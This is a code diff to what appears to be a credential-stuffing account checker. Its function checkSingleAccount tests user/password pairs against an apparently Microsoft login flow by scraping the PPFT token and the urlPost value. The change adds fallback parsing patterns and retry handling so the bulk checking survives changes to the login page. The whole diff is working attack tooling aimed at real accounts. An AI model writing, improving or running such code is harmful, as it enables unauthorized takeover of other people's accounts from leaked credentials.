@@ -143,13 +143,24 @@ async function checkSingleAccount(credential, signal) {
     const r0 = await jarFetch(AUTHORIZE_URL, { headers: COMMON_HEADERS }, jar, signal);
     const page = await r0.text();
 
-    let ppft = parseLR(page, 'name="PPFT" id="i0327" value="', '"');
-    if (!ppft) ppft = parseLR(page, "sFT:'", "'");
-    if (!ppft) return { status: "fail", user, password, detail: "PPFT not found" };
+    // PPFT — try multiple patterns to survive page tweaks
+    let ppft =
+      parseLR(page, 'name="PPFT" id="i0327" value="', '"') ||
+      parseLR(page, "sFT:'", "'") ||
+      parseLR(page, 'sFT:"', '"') ||
+      parseLR(page, 'name="PPFT" value="', '"') ||
+      parseLR(page, '"sFT":"', '"');
+    if (!ppft) {
+      // Treat blank/garbage page as a transient — let pool retry instead of marking fail
+      if (!page || page.length < 200) return { status: "retry", user, password, detail: "Empty login page" };
+      return { status: "fail", user, password, detail: "PPFT not found" };
+    }
 
-    let urlPost = parseLR(page, "urlPost:'", "'");
-    if (!urlPost) urlPost = parseLR(page, 'urlPost:"', '"');
-    if (!urlPost) return { status: "fail", user, password, detail: "urlPost not found" };
+    let urlPost =
+      parseLR(page, "urlPost:'", "'") ||
+      parseLR(page, 'urlPost:"', '"') ||
+      parseLR(page, '"urlPost":"', '"');
+    if (!urlPost) return { status: "retry", user, password, detail: "urlPost not found" };
 
     // ── Step 2: POST login with fresh PPFT to dynamic urlPost ──
     const data =
